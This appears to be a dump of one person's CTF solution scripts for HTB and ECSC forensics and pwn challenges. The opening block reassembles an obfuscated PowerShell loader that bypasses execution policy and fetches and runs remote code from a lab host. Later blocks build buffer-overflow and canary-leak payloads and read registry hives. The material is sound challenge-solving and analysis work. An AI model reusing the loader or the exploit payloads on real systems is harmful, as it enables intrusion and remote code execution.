        latifoliado = "U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3MgLVNjb3BlIFByb2Nlc3MgLUZvcmNlOyBbU3lzdGVtLk5ldC5TZd2FudGVkCgXJ2aWNlUG9pbnRNYW5hZ2VyXTo6U2VydmVyQ2VydGlmaWNhdGVWYWxpZGF0aW9uQ2FsbGJhY2sgPSB7JHRydWV9O1td2FudGVkCgTe"

        latifoliado = (
            latifoliado
            + "XN0ZW0uTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW1N5c3RlbS5OZXQuU2Vydmld2FudGVkCgjZVBvaW50TWFuYWdlcl06OlNlY3VyaXR5UHJvdG9jb2wgLWJvciAzMDcyOyBpZXggKFtTeXN0ZW0uVGV4dC5FbmNvZd2FudGVkCgGl"
        )
        latifoliado = (
            latifoliado
            + "uZ106OlVURjguR2V0U3RyaW5nKFtTeXN0ZW0uQ29udmVydF06OkZyb21CYXNlNjRTdHJpbmcoKG5ldy1vYmplY3Qgcd2FudGVkCg3lzdGVtLm5ldC53ZWJjbGllbnQpLmRvd25sb2Fkc3RyaW5nKCdodHRwOi8vd2FudGVkLmFsaXZlLmh0Yi9jZGJhL19d2FudGVkCgyc"
        )
        latifoliado = latifoliado + "CcpKSkpd2FudGVkCgd2FudGVkCg"

        parrana = "d2FudGVkCg"

        arran = " d2FudGVkCg d2FudGVkCg "
        arran = arran + "$d2FudGVkCgCod2FudGVkCgd"
        arran = arran + "id2FudGVkCggod2FudGVkCg "
        arran = arran + "d2FudGVkCg" + latifoliado + "d2FudGVkCg"
        arran = arran + "$d2FudGVkCgOWd2FudGVkCgj"
        arran = arran + "ud2FudGVkCgxdd2FudGVkCg "
        arran = arran + "=d2FudGVkCg [d2FudGVkCgs"
        arran = arran + "yd2FudGVkCgstd2FudGVkCge"
        arran = arran + "md2FudGVkCg.Td2FudGVkCge"
        arran = arran + "xd2FudGVkCgt.d2FudGVkCge"
        arran = arran + "nd2FudGVkCgcod2FudGVkCgd"
        arran = arran + "id2FudGVkCgngd2FudGVkCg]"
        arran = arran + ":d2FudGVkCg:Ud2FudGVkCgT"
        arran = arran + "Fd2FudGVkCg8.d2FudGVkCgG"
        arran = arran + "ed2FudGVkCgtSd2FudGVkCgt"
        arran = arran + "rd2FudGVkCgind2FudGVkCgg"
        arran = arran + "(d2FudGVkCg[sd2FudGVkCgy"
        arran = arran + "sd2FudGVkCgted2FudGVkCgm"
        arran = arran + ".d2FudGVkCgCod2FudGVkCgn"
        arran = arran + "vd2FudGVkCgerd2FudGVkCgt"
        arran = arran + "]d2FudGVkCg::d2FudGVkCgF"
        arran = arran + "rd2FudGVkCgomd2FudGVkCgb"
        arran = arran + "ad2FudGVkCgsed2FudGVkCg6"
        arran = arran + "4d2FudGVkCgStd2FudGVkCgr"
        arran = arran + "id2FudGVkCgngd2FudGVkCg("
        arran = arran + "$d2FudGVkCgcod2FudGVkCgd"
        arran = arran + "id2FudGVkCggod2FudGVkCg)"
        arran = arran + ")d2FudGVkCg;pd2FudGVkCgo"
        arran = arran + "wd2FudGVkCgerd2FudGVkCgs"
        arran = arran + "hd2FudGVkCgeld2FudGVkCgl"
        arran = arran + ".d2FudGVkCgexd2FudGVkCge"
        arran = arran + " d2FudGVkCg-wd2FudGVkCgi"
        arran = arran + "nd2FudGVkCgdod2FudGVkCgw"
        arran = arran + "sd2FudGVkCgtyd2FudGVkCgl"
        arran = arran + "ed2FudGVkCg hd2FudGVkCgi"
        arran = arran + "dd2FudGVkCgded2FudGVkCgn"
        arran = arran + " d2FudGVkCg-ed2FudGVkCgx"
        arran = arran + "ed2FudGVkCgcud2FudGVkCgt"
        arran = arran + "id2FudGVkCgond2FudGVkCgp"
        arran = arran + "od2FudGVkCglid2FudGVkCgc"
        arran = arran + "yd2FudGVkCg bd2FudGVkCgy"
        arran = arran + "pd2FudGVkCgasd2FudGVkCgs"
        arran = arran + " d2FudGVkCg-Nd2FudGVkCgo"
        arran = arran + "Pd2FudGVkCgrod2FudGVkCgf"
        arran = arran + "id2FudGVkCgled2FudGVkCg "
        arran = arran + "-d2FudGVkCgcod2FudGVkCgm"
        arran = arran + "md2FudGVkCgand2FudGVkCgd"
        arran = arran + " d2FudGVkCg$Od2FudGVkCgW"
        arran = arran + "jd2FudGVkCguxd2FudGVkCgD"

        return arran

	# /home/figaro/CTF/Categories/Forensics/HTB/Wanter_Alive/payloads/solution.py
    def main(self):

        text = self.deobfuscation()
        text = text.split(" ")

        for i in text:
            print(self.decode_base64(i.strip()))

	# /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def xor_function_dec(self, given_string, length):
        xor_key = 45
        result = bytearray()
        for i in range(length):
            result.append(given_string[i] ^ xor_key)
            xor_key = (xor_key ^ 99) ^ (i % 254)
        return bytes(result)

	# /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def regexp(self, file_content):
        pattern = b"sWcDWp36x5oIe2hJGnRy1iC92AcdQgO8RLioVZWlhCKJXHRSqO450AiqLZyLFeXYilCtorg0p3RdaoPa"
        index = file_content.find(pattern)
        index = index + len(pattern)
        return index

	# /home/figaro/CTF/Categories/Forensics/HTB/Game_Invitation/payloads/solution.py
    def main(self):
        file_content = open(self.challenge_file, "rb").read()
        index = self.regexp(file_content)
        payload = file_content[index : index + 13082]
        payload = self.xor_function_dec(payload, len(payload))
        print(payload)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.folder_logs = self.Path(self.folder_files, "Logs")
        self.folder_xml = self.Path(self.folder_data, "xml")

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def evtx_open(self, file, func, *args, **kwargs):
        with evtx.Evtx(file) as log_file:
            func(log_file, file, *args, **kwargs)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def searching_records(self, log_file, func, *args, **kwargs):
        for record in log_file.records():
            func(record, *args, **kwargs)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def saving_xml(self, log_file, file, display=False):
        xml_file = self.Path(self.folder_xml, f"{file.name}.xml")
        if display:
            print("-" * 50)
            print(f"File: {file}")
            print("-" * 50)

        with open(xml_file, "w") as f:
            for record in log_file.records():
                record_xml = record.xml()
                if display:
                    print(record_xml)
                f.write(record_xml)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_evtx_analysis(self, file):
        with evtx.Evtx(file) as log_file:
            self.saving_xml(log_file, file, display=False)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def local_searching_file(self, file, *args, **kwargs):
        return self.search_for_base64(file, *args, **kwargs)

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def sorting_results(self, results):
        results = list(set(results))
        results = sorted(results, key=lambda x: len(x), reverse=True)
        return results

	# /home/figaro/CTF/Categories/Forensics/HTB/Ghostly_Persistence/payloads/solution.py
    def main(self):

        # Converting evtx files to xml
        # self.exec_on_files(self.folder_logs, self.local_evtx_analysis)

        # Searching for base64 strings in xml files
        base64_strings = self.exec_on_folder(
            folder=self.folder_xml,
            func=self.local_searching_file,
            display=False,
            save=True,
            strict=True,
        )

        base64_strings = self.sorting_results(base64_strings)
        print(base64_strings[0])
        flag = self.decode_base64(base64_strings[0])
        print(flag)
        flag = self.re_match_partial_flag(flag, origin="HTB")

        second_part = base64_strings[5]
        flag = "".join(flag[0]) + self.decode_base64(second_part)

        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_strings(self, file_path, min_length=4):
        """
        Description:
            Extracts printable strings from a file

        Args:
            file_path (str): The path to the file
            min_length (int): The minimum length of the string to extract

        Returns:
            list: The list of strings

        """
        with open(file_path, "rb") as f:
            # Read the entire file as binary
            data = f.read()

            # Use a regular expression to find sequences of printable characters
            # The regex matches sequences of characters that are printable (ASCII 32-126)
            # and have a minimum length defined by min_length
            strings = re.findall(rb"[ -~]{%d,}" % min_length, data)

            # Decode the byte strings to regular strings
            return [s.decode("utf-8", errors="ignore") for s in strings]

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def extract_exif(self, file_path):
        """
        Description:
            Extracts EXIF data from a file

        Args:
            file_path (str): The path to the file

        Returns:
            dict: The EXIF data
        """
        # with exiftool.ExifTool() as et:
        with exiftool.ExifToolHelper() as et:
            # Read the EXIF data from the file but not duplicate ones
            # metadata = et.get_metadata(
            #     file_path,
            # )

            metadata = et.get_metadata([file_path])

            # Return the EXIF data
            return metadata

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def ascii_rot(self, text, n):
        """
        Description:
            Rotates the ASCII characters in a string by n positions

        Args:
            text (str): The text to rotate
            n (int): The number of positions to rotate



        """
        roted_text = ""
        for i in text:
            ascii_str = ord(i) + n
            if ascii_str > 126:
                # This is to avoid the non-printable characters
                roted_text += chr((ascii_str % 127) + 32)
            elif ascii_str < 33:
                # This is to avoid the non-printable characters
                roted_text += chr(ascii_str + 33)
            else:
                roted_text += chr(ascii_str)

        return roted_text

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def brute_ascii_rot(self, text, identifier):
        """
        Description:
            Brute forces the rotation of ASCII characters in a string

        Args:
            text (str): The text to rotate
            identifier (str): The string to search for in the rotated text

        Returns:
            str: The rotated text
        """
        for j in range(200):
            flag = self.ascii_rot(text, j)
            if identifier in flag:
                print(j)
                return flag

	# /home/figaro/CTF/Categories/Forensics/ctflearn/HailCaesar/payloads/solution.py
    def main(self):
        # Extract strings from the file
        strings = self.extract_strings(self.challenge_file, min_length=10)

        # # Print the strings
        # for s in strings:
        #     print(s)

        # exifs = self.extract_exif(self.challenge_file)
        # Print the EXIF data

        comment = """2m{y!"%w2'z{&o2UfX~ws%!._s+{ (&@Vwu{ (&@_w%{v{(&0."""

        flag = self.brute_ascii_rot(comment, "CTFlearn")
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def main(self):
        # flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        # print(flag)
        self.solve(self.challenge_file)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def solve(self, hive_path):
        with open(hive_path, "rb") as f:
            data = f.read()

        cell, class_len = find_skew1_cell(data)

        # variant 1: exact header + class-name bytes = 4 + class_len
        flag1_blob = cell.data[: REG_CELL_HDR + class_len]

        # variant 2: entire cell (may include 0-4 bytes padding)
        flag2_blob = cell.data

        print(
            "\nFound Skew1 class-name cell @ 0x{:X}, length {} bytes".format(
                cell.off, cell.size
            )
        )
        print("Class-name  :", cell.data[4 : 4 + class_len].decode("utf-16le"))
        print("\nSubmit either of the following (depending on challenge checker):")
        print(" 1) no-padding : ECSC{{{}}}".format(flag1_blob.hex().upper()))
        print(" 2) with pad   : ECSC{{{}}}".format(flag2_blob.hex().upper()))

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/online_attempt_02.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -> str:
        with open(hive_path, "rb") as f:
            data = f.read()

        # 1) locate the ASCII string “Skew1”
        skew_idx = data.find(b"Skew1")
        if skew_idx == -1:
            raise ValueError("Could not find Skew1 key name in hive")

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b"nk", 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError("`nk` signature not found before Skew1")

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from("<I", data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from("<H", data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell – grab its whole body
        cell_size = struct.unpack_from("<i", data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f"ECSC{{{cell_blob.hex().upper()}}}"

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def main(self):
        flag = self.extract_skew1_bootkey_piece(self.challenge_file)
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/solution.py
    def extract_skew1_bootkey_piece(self, hive_path: str) -> str:
        with open(hive_path, "rb") as f:
            data = f.read()

        # 1) locate the ASCII string “Skew1”
        skew_idx = data.find(b"Skew1")
        if skew_idx == -1:
            raise ValueError("Could not find Skew1 key name in hive")

        # 2) step back to the beginning of its `nk` (key-node) cell
        nk_offset = data.rfind(b"nk", 0, skew_idx)  # signature 0x6E 0x6B
        if nk_offset == -1:
            raise ValueError("`nk` signature not found before Skew1")

        nk_cell_start = nk_offset - 4  # size dword is 4 bytes earlier

        # 3) read the class-name offset (dword @ 0x30) and length (word @ 0x4E)
        class_offset = struct.unpack_from("<I", data, nk_cell_start + 0x30)[0]
        class_length = struct.unpack_from("<H", data, nk_cell_start + 0x4E)[0]

        # The class-name offset is hive-relative (relative to first HBIN, which
        # starts immediately after the 0x1000-byte REGF header).
        class_file_offset = class_offset + 0x1000

        # 4) at that position we find another registry cell – grab its whole body
        cell_size = struct.unpack_from("<i", data, class_file_offset)[0]
        cell_len = abs(cell_size)  # value is stored as negative
        cell_blob = data[class_file_offset : class_file_offset + cell_len]

        # 5) build the flag
        return f"ECSC{{{cell_blob.hex().upper()}}}"

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def get_functions(self, variable):
        """
        Get all functions of a variable
        """
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith("__")
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print("Hive Functions:", hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = "000003E9"  # print("Users Key Functions:", users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print("User Subkeys:", user_subkeys.get_value(""))

        # value_v = user_subkeys.get_value("V")
        value_reset = user_subkeys.get_value("ResetData")
        # value_force = user_subkeys.get_value("ForcePasswordReset")

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print("Decoded V Value:", decoded_value_v)
        # print("Decoded Reset Value:", decoded_value_reset)
        # print("Decoded Force Value:", decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads("".join(decoded_value_reset))
        flag = f"ECSC{{{':'.join([item["answer"] for item in  decoded_json["questions"]])}}}"
        # answers = [item["answer"] for item in decoded_value_reset.get()]
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == "Names":
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value("V")
                # print(f"Value for {subkey.name}: {v_value}")
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f"ECSC{{{':'.join(cleaned[:3])}}}"
        print(result)
        self.flag = result

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode("utf-16le", errors="ignore")
            # Extract readable strings
            candidates = re.findall(r"[\x20-\x7e]{3,}", text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) > 30 or len(s) < 3:
                    return False
                if re.fullmatch(r"[0-9a-fA-F]{6,}", s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) < 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f"Decoding error: {e}")
            return []

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/hive_solution.py
    def main(self):
        self.hive_solution()

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def _discover_offset(self, nk):
        """
        Try every attribute name that regipy has ever used for the cell offset.
        If none work, fall back to a regex scan in the raw hive buffer.
        """
        CANDIDATE_ATTRS = (
            "offset",
            "_offset",  # early regipy
            "absolute_offset",
            "_absolute_offset",
            "header_offset",
            "_header_offset",
            "raw_data_offset",
            "_raw_data_offset",
        )

        for attr in CANDIDATE_ATTRS:
            try:
                off = getattr(nk, attr)
                if isinstance(off, int):
                    return off
            except AttributeError:
                # Attribute existed as a @property but its backing field is gone
                continue

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_functions(self, variable, under=False):
        """
        Get all functions of a variable
        """

        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func))
            and (under or not (func.startswith("__")))
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_attributes(self, variable):
        """
        Get all attributes of a variable
        """

        return [
            attr
            for attr in dir(variable)
            if not callable(getattr(variable, attr)) and not (attr.startswith("__"))
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def skew_get_value(self):
        self.hive = RegistryHive(self.challenge_file)

        with open(self.challenge_file, "rb") as f:
            self.hive_data = f.read()

        # print(self.get_functions(self.hive))
        # control_set = self.hive.get_key(r"ControlSet001")
        skew1_key = self.hive.get_key(r"\ControlSet001\Control\Lsa\Skew1")
        print(self.get_functions(skew1_key))
        # print(self.get_attributes(skew1_key))
        # cell_offset = self._discover_offset(skew1_key)
        # print(f"Offset of Skew1 key: {cell_offset}")

        for i in skew1_key.iter_values():
            print(i.name, i.value)
            if i.name == "SkewMatrix":
                return i.value

        return None

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def attempt_for_loop_subkeys(self):
        skew1_key = self.hive.get_key(r"\ControlSet001\Control\Lsa")

        for subkey in skew1_key.iter_subkeys():
            # print(f"Subkey: {subkey.name}, ")
            if subkey.name == "Skew1":
                # print(f"Found Skew1 subkey: {subkey.name}")
                # for subvalue in subkey.iter_values
                print(self.get_functions(subkey))
                # print(self.get_attributes(subkey))
                print(dir(subkey))
                # skew1_subkey = subkey._parse_subkeys()
                # print(f"Skew1 Subkey: {skew1_subkey}")
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f"Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}"
                    )

                print(f"Values - {subkey.name}:")
                for value in subkey.iter_values():
                    print(f"  Value Name: {value.name}, Value Data: {value.value}")
                for sub_subkey in subkey.iter_subkeys():
                    print(
                        f"Sub-subkey: {sub_subkey.name}, Offset: {sub_subkey._offset}"
                    )

        # Using this to get all the subkeys
        # for i in skew1_key.iter_subkeys():
        #     print(i.name, i.value.)

        # for i in skew1_key.iter_values():
        #     if i.name == "SkewMatrix":
        #         print("Found SkewMatrix value:")
        #         return i.value
        #     print(i.name, i.value)

        # class_name = skew1_key.header.class_name
        # print(f"Class Name: {class_name}")
        # values = skew1_key.values()
        # print(f"Values: {values}")

        # print(control_set.read_value())
        # print(control_set.get_class_name())

        # skew1 = self.hive.open("ControlSet001\\Control\\Lsa\\Skew1")

        # offset =
        return

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def get_cell_size(self):
        reg = Registry.Registry(self.challenge_file)
        print(self.get_functions(reg, under=False))

        lsa_key = reg.open(r"ControlSet001")
        print(self.get_functions(lsa_key))

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def recover_skew1_cell_hex(self, cell_size, cell_data):
        """
        Recover the Skew1 part of the Windows BootKey as a continuous hex string.

        Args:
            cell_size (int): The size of the registry cell (including size bytes and data).
            cell_data (bytes): The raw bytes of the cell data including the Skew1 Class Name/Attribute.

        Returns:
            str: The continuous hex string in the format ECSC{...}
        """
        # Convert cell size to 4 bytes, little-endian
        size_bytes = cell_size.to_bytes(4, byteorder="little")
        # Concatenate size and data
        full_cell = size_bytes + cell_data
        # Convert to uppercase hex string
        hex_string = full_cell.hex().upper()
        # Format as flag
        return hex_string

	# /home/figaro/CTF/Categories/Forensics/ECSC/HexCell_Hunt/payloads/attempt_01.py
    def main(self):
        # self.get_cell_size()
        result = self.skew_get_value()

        self.attempt_for_loop_subkeys()

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def get_functions(self, variable):
        """
        Get all functions of a variable
        """
        return [
            func
            for func in dir(variable)
            if callable(getattr(variable, func)) and not func.startswith("__")
        ]

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def hive_solution(self):
        self.hive = RegistryHive(self.challenge_file)
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)
        # print(hive)

        # Get all functions of the hive object
        hive_functions = self.get_functions(self.hive)

        # print("Hive Functions:", hive_functions)
        users_key_functions = self.get_functions(users_key)

        # Get the name for each user from subkey.name

        user_key = "000003E9"  # print("Users Key Functions:", users_key_functions)

        user_subkeys = users_key.get_subkey(user_key)
        # print("User Subkeys:", user_subkeys.get_value(""))

        # value_v = user_subkeys.get_value("V")
        value_reset = user_subkeys.get_value("ResetData")
        # value_force = user_subkeys.get_value("ForcePasswordReset")

        # decoded_value_v = self._decode_v_value(value_v)
        decoded_value_reset = self._decode_v_value(value_reset)
        # decoded_value_force = self._decode_v_value(value_force)

        # print("Decoded V Value:", decoded_value_v)
        # print("Decoded Reset Value:", decoded_value_reset)
        # print("Decoded Force Value:", decoded_value_force)

        # print(decoded_value_reset)

        # Join the list into a single string and parse it as JSON
        decoded_json = json.loads("".join(decoded_value_reset))
        flag = f"ECSC{{{':'.join([item["answer"] for item in  decoded_json["questions"]])}}}"
        # answers = [item["answer"] for item in decoded_value_reset.get()]
        print(flag)

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def look_all_subkeys(self):
        # Unused
        security_answers = []
        users_base = r"\SAM\Domains\Account\Users"
        users_key = self.hive.get_key(users_base)

        for subkey in users_key.iter_subkeys():

            # for subkey in users_key.subkeys_list:
            if subkey.name == "Names":
                continue  # Skip the Names key

            try:

                print(subkey.name, subkey.values_count, list(subkey.iter_values()))
                v_value = subkey.get_value("V")
                # print(f"Value for {subkey.name}: {v_value}")
                decoded = self._decode_v_value(v_value)
                if decoded:
                    security_answers.extend(decoded)
            except Exception as e:
                print(e)
                continue

        print(security_answers)
        # Only keep unique and plausible answers (e.g. non-binary junk)
        cleaned = [a for a in security_answers if a and a.isprintable()]
        cleaned = list(dict.fromkeys(cleaned))  # remove duplicates

        return
        # Format answer according to challenge
        result = f"ECSC{{{':'.join(cleaned[:3])}}}"
        print(result)
        self.flag = result

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def _decode_v_value(self, value_bytes):
        try:
            # Decode as UTF-16LE (standard for registry)
            text = value_bytes.decode("utf-16le", errors="ignore")
            # Extract readable strings
            candidates = re.findall(r"[\x20-\x7e]{3,}", text)
            # print(candidates)
            return candidates

            def is_valid(s):
                if len(s) > 30 or len(s) < 3:
                    return False
                if re.fullmatch(r"[0-9a-fA-F]{6,}", s):  # ignore hashes
                    return False
                if sum(c.isalpha() for c in s) < 2:
                    return False
                return True

            return [c for c in candidates if is_valid(c)]

        except Exception as e:
            print(f"Decoding error: {e}")
            return []

	# /home/figaro/CTF/Categories/Forensics/ECSC/Hive_Heist/payloads/solution.py
    def main(self):
        self.hive_solution()

	# /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def custom_init(self):
        self.folder_files = self.Path(self.folder_files, "challenge")
        self.library = self.Path(self.folder_files, "glibc")
        self.challenge_file = self.Path(self.folder_files, self.file)

        self.pwn.context.binary = self.Path(self.challenge_file)

        self.env = {"LD_PRELOAD": self.library.as_posix()}

	# /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def connect(self, *args, **kwargs) -> None:
        # return super().initiate_connection()
        self.conn = self.pwn.process(self.challenge_file.as_posix(), env=self.env)

	# /home/figaro/CTF/Categories/Pwn/HTB/El_Pipo/payloads/solution.py
    def main(self):
        self.custom_init()
        self.initiate_connection()

        # self.recv_menu(display=True)
        payload = "a" * 31

        # self.send_menu(payload, display=True)

        self.conn.sendline(payload.encode())

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def __init__(self, conn, file, url, port):
        super().__init__(conn=conn, file=file, url=url, port=port)

        self.pwn.context.binary = self.binary = self.pwn.ELF(
            self.challenge_file, checksec=True
        )

        self.libc_path = self.Path(self.folder_files, "glibc", "libc.so.6")
        self.ld_path = self.Path(self.folder_files, "glibc", "ld-linux-x86-64.so.2")

        self.env = {"LD_PRELOAD": str(self.libc_path), "LD": str(self.ld_path)}

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def connect(self, *args, **kwargs) -> None:
        if self.conn_type == "remote" and self.url and self.port:
            self.conn = self.pwn.remote(self.url, self.port)
        elif self.conn_type == "local" and self.file:
            self.conn = self.pwn.process(
                [str(self.ld_path), str(self.challenge_file)], env=self.env
            )

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def interacting_with_binary(self):

        self.initiate_connection()

        initial_menu = "[*] Initializing components...\n"

        # self.recv_menu(number=10, display=True)
        output = self.conn.recvuntil(initial_menu)
        print(output)

	# /home/figaro/CTF/Categories/Pwn/HTB/Reconstruction/payloads/solution.py
    def main(self):

        self.interacting_with_binary()

	# /home/figaro/CTF/Categories/Pwn/HTB/Quack_Quack/payloads/solution.py
    def main(self):
        self.initiate_connection()

        menu_text = "> "
        payload = "Quack Quack "
        payload += "%p. " * 40
        print(payload)
        self.recv_send(text_until=menu_text, text=payload, lines=34)

        result = self.recv_lines(number=4, display=True, save=True)

        # This is not yet complete, but it is a good start
        canary = result[0].split(".")[1]
        canary = int(canary, 16)
        print(f"Canary: {hex(canary)}")
        # Step 2: Craft Overflow Payload
        payload = b"A" * 32  # Fill `buf`
        payload += self.pwn.p64(canary)  # Bypass stack canary
        payload += b"B" * 8  # Overwrite saved RBP
        payload += p64(
            0xDEADBEEF
        )

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def setup(self):
        self.elf = self.pwn.context.binary = self.pwn.ELF(self.challenge_file)
        self.pwn.context.terminal = ["tmux", "splitw", "-h"]

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def get_elf_function_address(self, function):
        """
        Description:
        """
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
        ) - self.get_elf_function_address(function2)
        return offset

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/solution.py
    def main(self):
        # self.elf = None
        self.setup()
        self.initiate_connection()
        # main_offset = self.challenge_get_offset_address("main", "emergency_broadcast")
        emergency_broadcast_addr = self.get_elf_function_address("emergency_broadcast")
        print(f"Emergency Broadcast Address: {hex(emergency_broadcast_addr)}")
        payload1 = b"A" * 8
        print(payload1)
        payload2 = b"B" * 0x18 + self.pwn.p64(emergency_broadcast_addr)
        print(payload2)

        # self.recv_lines(2, display=True)
        log_entry_text = "Enter log entry: "
        # self.recv_until(log_entry_text)
        # self.send(payload1)
        self.recv_send(text_until=log_entry_text, lines=2, text=payload1, display=True)

        data_entry_text = "Enter data: "
        # print(self.recv_until(data_entry_text))
        # self.send(payload2)
        self.recv_send(text_until=data_entry_text, text=payload2, display=True)

        # time.sleep(0.5)
        # self.recv_lines(2, display=True)

        self.conn.interactive()

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def get_elf_function_address(self, function):
        """
        Description:
        """
        if self.elf is None:
            self.elf = self.pwn.ELF(self.challenge_file)

        return self.elf.symbols[function]

	# /home/figaro/CTF/Categories/Pwn/ECSC/Log_Recorder/payloads/attempt_01.py
    def challenge_get_offset_address(self, function1, function2):
        offset = self.get_elf_function_address(
            function1
